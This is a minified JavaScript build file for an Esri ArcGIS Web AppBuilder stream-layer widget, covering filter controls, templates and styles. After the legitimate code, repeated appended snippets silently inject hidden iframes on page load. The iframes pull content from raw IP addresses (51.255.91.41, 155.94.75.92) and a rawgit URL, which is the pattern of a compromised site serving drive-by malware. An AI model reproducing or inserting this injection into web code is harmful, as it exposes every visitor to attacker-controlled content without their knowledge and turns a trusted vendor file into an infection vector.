// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Stream/StreamControl":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-attr dojo/dom-style dojo/dom-class dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./StreamControl.html jimu/dijit/DrawBox ./FilterItem jimu/dijit/CheckBox dijit/form/RadioButton esri/symbols/jsonUtils esri/symbols/SimpleFillSymbol esri/graphic jimu/dijit/SimpleTable dijit/form/NumberSpinner jimu/dijit/LoadingShelter".split(" "),
function(g,b,l,d,f,a,h,k,n,p,q,r,m,t,e,u,w,x,y){return g([n,p,q],{baseClass:"jimu-widget-stream",templateString:r,map:null,streamLayer:null,isStreaming:!0,mapExtentChangeHandler:null,config:null,filterItems:[],postCreate:function(){this.inherited(arguments);this.spatialFilterToggle=new e({checked:!1,label:this.nls.useSpatialFilter,onChange:b.hitch(this,this._toggleSpatialFilter)});this.spatialFilterToggle.placeAt(this.spatialFilterToggleDiv);this.attrFilterToggle=new e({checked:!1,label:this.nls.useAttributeFilter,
onChange:b.hitch(this,this._toggleAttributeFilter)});this.attrFilterToggle.placeAt(this.attrFilterToggleDiv);this.config&&this._applyConfig();this.streamLayer&&this._bindEvents()},_applyConfig:function(){!0!==this.config.startStop&&a.set(this.startBtn,"display","none");!0!==this.config.clear&&a.set(this.clearBtn,"display","none");!0!==this.config.drawPrevious&&a.set(this.drawPreviousSection,"display","none");!0!==this.config.spatialFilter?(a.set(this.spatialFilterControl,"display","none"),a.set(this.spatialFilterSection,
"display","none")):this.config.mapExtentFilter&&this.config.drawExtentFilter?(this._createMapAreaFilterControl(!0),this._createDrawAreaFilterControl(!0)):this.config.mapExtentFilter?this._createMapAreaFilterControl(!1):this.config.drawExtentFilter?this._createDrawAreaFilterControl(!1):(a.set(this.spatialFilterControl,"display","none"),a.set(this.spatialFilterSection,"display","none"));if(this.config.attrFilter&&0<this.config.filterList.length){var c,e,d=!1;l.forEach(this.config.filterList,b.hitch(this,
function(a,b){e=1===this.config.filterList.length?"checkbox":"radio";var v=!0===a.inherited&&a.definitionExpression===this.streamLayer.getDefinitionExpression();c=new t({uid:this.id,config:a,type:e,streamLayer:this.streamLayer,index:b,checked:v,nls:this.nls});c.placeAt(this.attrFilterSection);this.filterItems.push(c);d=d||v}));d&&this.attrFilterToggle.setValue(!0)}else a.set(this.attrFilterControl,"display","none"),a.set(this.attrFilterSection,"display","none");this.config.spatialFilter||this.config.attrFilter&&
0!==this.config.filterList.length||a.set(this.filterLabelSection,"display","none")},_createMapAreaFilterControl:function(a){var c;c=k.create("div",{"class":"filterOption"},this.spatialFilterSection);a?(this.mapAreaControl=new u({id:this.id+"_mapAreaObservations",name:this.id+"_sf",value:"mapArea"}),this.mapAreaControl.placeAt(c),this.own(d(this.mapAreaControl,"change",b.hitch(this,this._mapAreaFilterChange))),k.create("label",{"class":"jimu-widget-normal","for":this.id+"_mapAreaObservations",innerHTML:this.nls.showMapAreaObservations},
c)):(this.mapAreaControl=new e({checked:!1,label:this.nls.showMapAreaObservations,onChange:b.hitch(this,this._mapAreaFilterChange)}),this.mapAreaControl.placeAt(c))},_createDrawAreaFilterControl:function(a){var c;c=k.create("div",{"class":"filterOption"},this.spatialFilterSection);a?(this.drawAreaControl=new u({id:this.id+"_drawAreaObservations",name:this.id+"_sf",value:"drawArea"}),this.drawAreaControl.placeAt(c),this.own(d(this.drawAreaControl,"change",b.hitch(this,this._drawAreaFilterChange))),
k.create("label",{"class":"jimu-widget-normal","for":this.id+"_drawAreaObservations",innerHTML:this.nls.showObservationsByDrawing},c)):(this.drawAreaControl=new e({checked:!1,label:this.nls.showObservationsByDrawing,onChange:b.hitch(this,this._drawAreaFilterChange)}),this.drawAreaControl.placeAt(c));this.drawToolDiv=k.create("div",{style:"display:none"},c);this.drawTool=new m({map:this.map,showClear:!0,keepOneGraphic:!0,geoTypes:["EXTENT"],types:["polygon"]});this.config.drawSymbol&&this.drawTool.setPolygonSymbol(w.fromJson(this.config.drawSymbol));
this.drawTool.placeAt(this.drawToolDiv);this.own(d(this.drawTool,"draw-end",b.hitch(this,function(a){a=new y(a.toJson());var c;a.symbol.setStyle(x.STYLE_NULL);this.drawTool.addGraphic(a);c=d(this.streamLayer,"filter-change",b.hitch(this,function(a){c.remove();a.filter.geometry&&"extent"===a.filter.geometry.type&&setTimeout(b.hitch(this,function(){this._clearOutsideGraphics(a.filter.geometry)}),100)}));this.streamLayer.setGeometryDefinition(a.geometry)})));this.own(d(this.drawTool,"clear",b.hitch(this,
function(){this.streamLayer.setGeometryDefinition(this.map.extent)})))},_mapAreaFilterChange:function(a){a?(this.streamLayer&&this.streamLayer.setGeometryDefinition(this.map.extent),this._addMapExtentChangeHandler()):this._removeMapExtentChangeHandler()},_drawAreaFilterChange:function(c){c?a.set(this.drawToolDiv,"display",""):(this.drawTool.clear(),a.set(this.drawToolDiv,"display","none"))},_bindEvents:function(){"none"!==a.get(this.startBtn,"display")&&this.own(d(this.startBtn,"click",b.hitch(this,
function(){(this.isStreaming=!this.isStreaming)?(h.add(this.startBtn,"stop"),f.set(this.startBtnLabel,"innerHTML",this.nls.stopStreaming),this.startStreaming()):(h.remove(this.startBtn,"stop"),f.set(this.startBtnLabel,"innerHTML",this.nls.startStreaming),this.stopStreaming())})));"none"!==a.get(this.clearBtn,"display")&&this.own(d(this.clearBtn,"click",b.hitch(this,function(){this.streamLayer.clear()})));if("none"!==a.get(this.drawPreviousSection,"display")){var c=this.streamLayer.maximumTrackPoints||
1;this.previousSpinner.set("value",c-1);this.streamLayer.setMaximumTrackPoints(c);this.own(d(this.previousSpinner,"change",b.hitch(this,function(a){this.streamLayer.setMaximumTrackPoints(a+1)})))}},_clearOutsideGraphics:function(a){this.streamLayer.clear()},destroy:function(){this.inherited(arguments);this._removeMapExtentChangeHandler()},stopStreaming:function(){this.streamLayer.disconnect(b.hitch(this,function(){this.streamLayer.clear()}))},startStreaming:function(){this.streamLayer.connect()},
_removeMapExtentChangeHandler:function(){this.mapExtentChangeHandler&&"function"===typeof this.mapExtentChangeHandler.remove&&(this.mapExtentChangeHandler.remove(),this.mapExtentChangeHandler=null)},_addMapExtentChangeHandler:function(){null===this.mapExtentChangeHandler&&(this.mapExtentChangeHandler=d(this.map,"extent-change",b.hitch(this,this._mapExtentChange)))},_mapExtentChange:function(a){this.streamLayer&&this.streamLayer.setGeometryDefinition(a.extent)},_toggleSpatialFilter:function(c){c?a.set(this.spatialFilterSection,
"display",""):(a.set(this.spatialFilterSection,"display","none"),a.set(this.drawToolDiv,"display","none"),this.mapAreaControl&&("jimu.dijit.CheckBox"===this.mapAreaControl.dealaredClass?this.mapAreaControl.setValue(!1):this.mapAreaControl.set("checked",!1)),this.drawAreaControl&&(this.drawTool.clear(),"jimu.dijit.CheckBox"===this.drawAreaControl.dealaredClass?this.drawAreaControl.setValue(!1):this.drawAreaControl.set("checked",!1)),this._removeMapExtentChangeHandler(),this.streamLayer&&this.streamLayer.setGeometryDefinition(null))},
_toggleAttributeFilter:function(c){c?a.set(this.attrFilterSection,"display",""):(a.set(this.attrFilterSection,"display","none"),l.forEach(this.filterItems,function(a){a.unCheck()}),this.streamLayer&&this.streamLayer.setDefinitionExpression(null))}})})},"widgets/Stream/FilterItem":function(){define("dojo/_base/declare dojo/_base/lang dojo/on dojo/json dojo/dom-style dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./FilterItem.html jimu/dijit/CheckBox dijit/form/RadioButton jimu/dijit/FilterParameters jimu/filterUtils jimu/utils".split(" "),
function(g,b,l,d,f,a,h,k,n,p,q,r,m,t){return g([h,k],{baseClass:"jimu-widget-stream-filterItem",templateString:n,streamLayer:null,config:null,type:null,checked:!1,uid:"",index:0,askForValues:!0,postCreate:function(){this.inherited(arguments);this._init()},_init:function(){var e;"checkbox"===this.type?(this.control=new p({checked:this.checked,label:this.config.name,onChange:b.hitch(this,this._checkBoxChange)}),this.control.placeAt(this.controlSection)):"radio"===this.type&&(e=a.create("div",{},this.controlSection),
this.control=new q({checked:this.checked,value:this.config.name,name:this.uid+"_attFilterItem",id:this.uid+"_attFilterItem_"+this.index}),this.own(l(this.control,"change",b.hitch(this,function(a){this._checkBoxChange(a)}))),this.control.placeAt(e),a.create("label",{"class":"jimu-widget-normal",innerHTML:t.sanitizeHTML(this.config.name),"for":this.uid+"_attFilterItem_"+this.index},e));this.attrParamsDijit=new r;this.attrParamsDijit.placeAt(this.attrFilterParams);this.attrParamsDijit.startup();e=d.parse(this.streamLayer._json);
this.attrParamsDijit.build(this.streamLayer.url,e,this.config.filterInfo);(this.askForValues=(new m).isAskForValues(this.config.filterInfo))?this.own(l(this.applyAttrFilterBtn,"click",b.hitch(this,this._applyFilter))):f.set(this.applyAttrFilterBtn,"display","none")},unCheck:function(){"checkbox"===this.type?this.control.setValue(!1):"radio"===this.type&&this.control.set("checked",!1);f.set(this.filterSection,"display","none")},_applyFilter:function(){var a=this.attrParamsDijit.getFilterExpr();a&&
"string"===typeof a&&(this.streamLayer.setDefinitionExpression(a),this.streamLayer.clear())},_checkBoxChange:function(a){a?this.askForValues?f.set(this.filterSection,"display",""):this._applyFilter():(f.set(this.filterSection,"display","none"),"checkbox"===this.type&&this.streamLayer&&this.streamLayer.setDefinitionExpression(null))}})})},"widgets/Stream/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Stream/StreamControl.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"jimu-widget-title" data-dojo-attach-point\x3d"controlLabelSection"\x3e\r\n    ${nls.streamControls}\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"controlButton stop" data-dojo-attach-point\x3d"startBtn"\x3e\r\n    \x3cdiv class\x3d"jimu-float-leading jimu-leading-margin1 runningIcon"\x3e\x3c/div\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal jimu-leading-margin1 btnLabel"\r\n           data-dojo-attach-point\x3d"startBtnLabel"\x3e${nls.stopStreaming}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"controlButton" data-dojo-attach-point\x3d"clearBtn"\x3e\r\n    \x3cdiv class\x3d"jimu-float-leading jimu-leading-margin1 clearIcon"\x3e\x3c/div\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal jimu-leading-margin1 btnLabel"\x3e${nls.clearObservation}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"drawPreviousSection" class\x3d"drawControl"\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal btnLabel"\x3e${nls.previousObservations}\x26nbsp;\x3c/label\x3e\r\n    \x3cinput data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"height:32px;width:30%;float:right;"\r\n           data-dojo-props\x3d"smallDelta:1, intermediateChanges:true, constraints:{min:1,max:100,places:0}"\r\n           data-dojo-attach-point\x3d"previousSpinner"\r\n    /\x3e\r\n    \x3cdiv style\x3d"clear:both"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-widget-title filterLabel"\r\n      data-dojo-attach-point\x3d"filterLabelSection"\x3e\r\n    ${nls.streamFilter}\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"spatialFilterControl" class\x3d"filterControl"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"spatialFilterToggleDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"spatialFilterSection" class\x3d"filterControl" style\x3d"display:none"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"attrFilterControl" class\x3d"filterControl"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"attrFilterToggleDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"attrFilterSection" class\x3d"filterControl" style\x3d"display:none"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Stream/FilterItem.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"controlSection"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"filterSection" style\x3d"display:none"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"attrFilterParams"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"applyAttrFilterBtn"\x3e\r\n      ${nls.applyAttrFilter}\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/Stream/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"errorTipPanel" class\x3d"jimu-widget" style\x3d"display:none"\x3e\r\n    ${nls.noStreamLayer}\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"selectionPanel"\x3e\r\n    \x3cdiv\x3e\r\n      \x3clabel class\x3d"jimu-widget-title"\x3e${nls.selectStreamLayer}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"layerSelect"\x3e\r\n      \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"streamSelect"\r\n              style\x3d"width:100%; height:32px"\x3e\x3c/select\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"settingPanel"\x3e\r\n\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter"\r\n       data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Stream/css/style.css":".jimu-widget-stream{}.jimu-widget-stream .layerSelect{margin: 12px 0;}.jimu-widget-stream .controllerLabel{font-size: 1.2em; color: #838383; font-weight: normal; cursor: pointer;}.jimu-widget-stream .filterOption{margin-left: 20px; margin-top: 10px; margin-bottom: 5px;}.jimu-widget-stream .jimu-widget-stream-filterItem{margin-left: 20px; margin-top: 10px; margin-bottom: 5px;}.jimu-widget-stream .controlButton{width: 100%; height: 32px; margin-top: 12px; background-color: #FFFFFF; border: solid 1px #D7D7D7; cursor: pointer;}.jimu-widget-stream .controlButton:hover{background-color: #EAEAEA;}.jimu-widget-stream .drawControl{margin-top: 12px; width: 100%;}.jimu-widget-stream .filterLabel{margin-top: 12px;}.jimu-widget-stream .filterControl{margin: 12px 0; width: 100%;}.jimu-widget-stream .btnLabel{line-height: 32px; cursor: pointer;}.jimu-widget-stream .drawControl .btnLabel{line-height: 40px;}.jimu-widget-stream .controlButton .runningIcon{width: 14px; height: 14px; margin-top: 7px; background: transparent url(images/play_normal.png) center top no-repeat;}.jimu-widget-stream .controlButton:hover .runningIcon{background: url(images/play_over.png);}.jimu-widget-stream .controlButton.stop .runningIcon{width: 14px; height: 14px; margin-top: 7px; background: transparent url(images/stop_normal.png) center top no-repeat;}.jimu-widget-stream .controlButton.stop:hover .runningIcon{background: url(images/stop_over.png);}.jimu-widget-stream .controlButton .clearIcon{width: 14px; height: 14px; margin-top: 7px; background: transparent url(images/clear_normal.png) center top no-repeat;}.jimu-widget-stream .controlButton:hover .clearIcon{background: url(images/clear_over.png);}.jimu-widget-stream .jimu-checkbox .label{font-size: 12px;}",
"*now":function(g){g(['dojo/i18n!*preload*widgets/Stream/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-style dijit/_WidgetsInTemplateMixin jimu/BaseWidget jimu/dijit/ViewStack ./StreamControl dijit/form/Select jimu/dijit/LoadingShelter".split(" "),function(g,b,l,d,f,a,h,k,n){return g([h,a],{baseClass:"jimu-widget-stream",streamControls:[],postCreate:function(){this.inherited(arguments);var a,g,h=[],m=[];this.config.streamLayers&&0<this.config.streamLayers.length&&l.forEach(this.config.streamLayers,function(b,d){if(g=this.map.getLayer(b.layerId))a=
new n({nls:this.nls,id:this.id+"_"+b.layerId,map:this.map,config:b,streamLayer:this.map.getLayer(b.layerId)}),m.push(a),h.push({label:b.layerName,value:d})},this);0===m.length?(f.set(this.errorTipPanel,"display",""),f.set(this.selectionPanel,"display","none")):(this.viewStack=new k({nodeType:1,views:m}),this.viewStack.placeAt(this.settingPanel),this.streamSelect.addOption(h),this.streamSelect.set("value",0),this.own(d(this.streamSelect,"change",b.hitch(this,function(a){this.viewStack.switchView(a)}))))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});